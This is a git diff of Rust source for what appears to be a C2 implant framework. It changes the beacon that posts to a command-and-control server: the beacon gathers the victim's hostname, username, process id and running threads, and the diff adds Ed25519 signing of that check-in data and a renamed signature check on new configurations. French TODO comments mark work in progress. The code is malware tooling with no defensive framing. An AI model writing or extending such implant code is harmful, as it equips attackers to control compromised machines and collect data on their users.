@@ -59,7 +59,7 @@ impl Link {
                 error
             ),
         };
-        match config.verify_newloader_sign(&newconfig) {
+        match config.verify_newconfig_signature(&newconfig) {
             Ok(()) => (),
             _unspecified => {
                 bail!(
@@ -421,9 +421,13 @@ pub struct PostToC2 {
     pub pid: u32,
     pub data_operation: Vec<DataOperation>,
     pub running_thread: Vec<String>,
+    pub peer_public_key_bytes : Vec<u8>,
+    pub sign_bytes: Vec<u8>,
 }
 
 use std::process;
+use ring::signature::Ed25519KeyPair;
+use ring::signature::{self, KeyPair};
 
 impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
@@ -437,7 +441,7 @@ impl LinkFetch for HTTPPostC2Link {
             tt.push(i.string_payload_compact());
         }
 
-        let post_data: PostToC2 = PostToC2{
+        let mut post_data: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
             username: whoami::username(),
@@ -447,10 +451,27 @@ impl LinkFetch for HTTPPostC2Link {
             pid: process::id(),
             data_operation: self.dataoperation.clone(),
             running_thread: tt.clone(),
+            peer_public_key_bytes: vec![],
+            sign_bytes: vec![],
             //running_thread: running_thread.clone(),
         };
+        //TODO signature ici (sans faire via la config pour commencer)
+        let keypair = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
+        let key_pair = Config::fromfile_master_keypair(keypair.as_str());
+        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
+        let sign_data = format!("sign_data: {:?}", post_data);
+        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
+        let sign_bytes = sig.as_ref().to_vec();
+        post_data.peer_public_key_bytes= peer_public_key_bytes;
+        post_data.sign_bytes= sign_bytes;
+
+        //TODO attention, c'est avec la signature qu'on veut post_data
         let post_data_bytes= serde_json::to_vec(&post_data).unwrap();
         let m: Vec<u8>  = apply_all_dataoperations(&mut self.dataoperation_post.clone() , post_data_bytes).unwrap();
+
+
+
+
 
         // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
         //map.insert("config", format!("{:?}", config));
